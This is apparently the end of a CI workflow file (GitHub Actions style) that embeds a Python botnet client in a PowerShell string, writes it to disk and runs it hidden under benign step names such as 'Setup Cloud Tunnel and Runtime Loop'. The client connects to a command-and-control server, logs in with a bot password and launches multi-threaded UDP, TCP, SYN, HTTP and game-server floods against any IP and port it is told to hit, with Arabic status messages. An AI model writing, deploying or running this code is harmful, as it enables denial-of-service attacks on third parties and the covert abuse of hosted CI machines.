def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        # UDP attacks
        '.UDP': attack_udp_bypass,
        '.UDPOVH': attack_ovh_udp,
        '.UDPBYPASS': attack_udp_bypass,
        '.UDP-RAW': attack_udp_bypass,

        # TCP attacks
        '.TCP': attack_tcp_bypass,
        '.TCPBYPASS': attack_tcp_bypass,
        '.TCPKILL': attack_tcp_bypass,
        '.TCP-RAW': attack_tcp_bypass,
        '.OVHTCP': attack_ovh_tcp,

        # Mixed attacks
        '.MIX': attack_tcp_udp_bypass,
        '.MIXED': attack_tcp_udp_bypass,
        '.SOCKET': attack_tcp_udp_bypass,

        # Special attacks
        '.SYN': attack_syn,
        '.SYNFLOOD': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.DISCORD': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.FORTNITE': attack_fivem,

        # HTTP attacks
        '.HTTP': attack_http_get,
        '.HTTPGET': attack_http_get,
        '.HTTPPOST': attack_http_post,
        '.HTTPBYPASS': attack_http_post,
        '.HTTP-ETHONE': attack_http_post,
        '.BROWSER': attack_browser,
        '.CLOUDFLARE': attack_http_post,

        # Special attacks
        '.HEX': attack_hex,
        '.OVHUDP': attack_ovh_udp,
        '.STOMP-RAW': attack_udp_bypass,
        '.R6-RAW': attack_udp_bypass,
        '.HOMEHOLD': attack_http_get,
    }
    methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration

    for _ in range(thread_count):
        t = threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True)
        t.start()

        if username not in user_attacks:
            user_attacks[username] = []
        user_attacks[username].append((t, stop_event))

def stop_attacks(username=None):
    if username is None:
        for attack_list in user_attacks.values():
            for _, stop_event in attack_list:
                stop_event.set()
        user_attacks.clear()
        return

    if username in user_attacks:
        for _, stop_event in user_attacks[username]:
            stop_event.set()
        user_attacks.pop(username, None)


def parse_attack_command(args):
    if len(args) < 4:
        return None

    method = args[0].upper()
    ip = args[1]
    try:
        port = int(args[2])
        secs = int(args[3])
    except ValueError:
        return None

    threads = 992
    username = 'default'

    if len(args) == 5:
        if args[4].isdigit():
            threads = int(args[4])
        else:
            username = args[4]
    elif len(args) >= 6:
        if args[4].isdigit():
            threads = int(args[4])
            username = args[5]
        else:
            username = args[4]
            if args[5].isdigit():
                threads = int(args[5])

    return method, ip, port, secs, threads, username


def main():
    while 1:
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            print(f"[+] تم الاتصال بـ C2 على {C2_ADDRESS}:{C2_PORT}")

            # استقبال طلب اسم المستخدم
            while 1:
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    arch = get_architecture()
                    c2.send((arch + '\n').encode())
                    print(f"[+] تم إرسال البنية: {arch}")
                    break

            # استقبال طلب كلمة السر
            while 1:
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send((BOT_PASSWORD + '\n').encode())
                    print(f"[+] تم إرسال كلمة السر")
                    break

            # حلقة استقبال الأوامر
            while 1:
                try:
                    data = c2.recv(1024)
                    if not data:
                        print("[-] تم قطع الاتصال من طرف الخادم")
                        break

                    msg = data.decode().strip()
                    if not msg:
                        continue

                    print(f"[*] تم استقبال أمر: {msg}")
                    args = msg.split()
                    if not args:
                        continue

                    command = args[0].upper()

                    if command == 'PING':
                        c2.sendall(b'PONG\n')
                        print("[+] تم الرد على PING")

                    elif command == 'STOP' and len(args) > 1:
                        stop_target = args[1]
                        if stop_target.upper() == 'ALL':
                            stop_attacks()
                            print("[+] تم إيقاف جميع الهجمات")
                        else:
                            stop_attacks(stop_target)
                            print(f"[+] تم إيقاف الهجمات للمستخدم: {stop_target}")

                    elif command.startswith('.') and len(args) >= 4:
                        attack_params = parse_attack_command(args)
                        if not attack_params:
                            print(f"[-] أمر غير كامل أو خاطئ: {msg}")
                            continue
                        method, ip, port, secs, threads, username = attack_params
                        print(f"[*] بدء هجوم: {method} على {ip}:{port} لمدة {secs}s مع {threads} خيط")
                        print(f"[+] جاري إرسال الباكيتات...")
                        start_attack(method, ip, port, secs, threads, username)
                        print(f"[+] تم بدء الهجوم - ستستقبل الباكيتات لمدة {secs} ثانية")

                    else:
                        print(f"[-] أمر غير معروف أو غير مدعوم: {msg}")
                except Exception as e:
                    print(f"[-] خطأ في استقبال الأمر: {e}")
                    import traceback
                    traceback.print_exc()
                    break
        except Exception as e:
            print(f"[-] خطأ الاتصال: {e}")
            time.sleep(10)
        finally:
            try:
                c2.close()
                print("[-] تم إغلاق الاتصال")
            except:
                pass

if __name__ == '__main__':
    try:
        main()
    except:
        pass
print("Bot running...")
]
"@
          $botCode = $botCode -replace '^\[\s*[\r\n]+', '' -replace '[\r\n]+\s*\]$', ''
          Set-Content -Path "C:\app-runtime.py" -Value $botCode

      - name: Setup Cloud Tunnel and Runtime Loop
        run: |
          Write-Host "Starting Core Engine and Script Tasks..."
          Start-Process python -ArgumentList "C:\app-runtime.py" -WindowStyle Hidden
          
          while ($true) {
              Write-Host "[$(Get-Date)] System Engine is stable and online..."
              Start-Sleep -Seconds 300
          }
